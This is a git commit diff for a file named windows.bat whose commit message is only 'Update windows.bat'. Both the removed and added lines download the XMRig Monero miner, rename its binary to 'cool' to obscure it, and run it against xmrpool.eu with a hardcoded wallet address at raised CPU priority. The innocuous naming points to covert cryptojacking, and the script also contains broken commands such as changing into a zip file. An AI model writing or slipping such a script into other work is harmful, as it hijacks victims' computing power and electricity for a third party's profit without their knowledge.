740f0101d4988e3d28f94eb2d715be1247de7c2b
Lachine <86872452+Lachine1@users.noreply.github.com>
2024-05-24 18:51:00 +0200

    Update windows.bat

--- windows.bat
+++ windows.bat
@@ -1,1 +1,5 @@
-wget https://github.com/xmrig/xmrig/releases/download/v6.21.3/xmrig-6.21.3-msvc-win64.zip && unzip  xmrig-6.21.3-msvc-win64.zip && cd xmrig-6.21.3-msvc-win64.zip && move xmrig cool && ./cool -o xmrpool.eu:3333 -u 4BCzRFseZPce3GUMsqGEHjeSgzzBhE3C72JdGdapz3kgdWpq4ri7NbNfTKCotSdAP2a6c6f4Qq3XHWRMJX1EYJnrDrSeJG3 --cpu-priority 4
+Invoke-WebRequest -Uri "https://github.com/xmrig/xmrig/releases/download/v6.21.3/xmrig-6.21.3-msvc-win64.zip" -OutFile "xmrig.zip"
+unzip xmrig.zip
+cd xmrig.zip
+move xmrig.exe cool.exe
+.\cool.exe -o xmrpool.eu:3333 -u 4BCzRFseZPce3GUMsqGEHjeSgzzBhE3C72JdGdapz3kgdWpq4ri7NbNfTKCotSdAP2a6c6f4Qq3XHWRMJX1EYJnrDrSeJG3 --cpu-priority 4
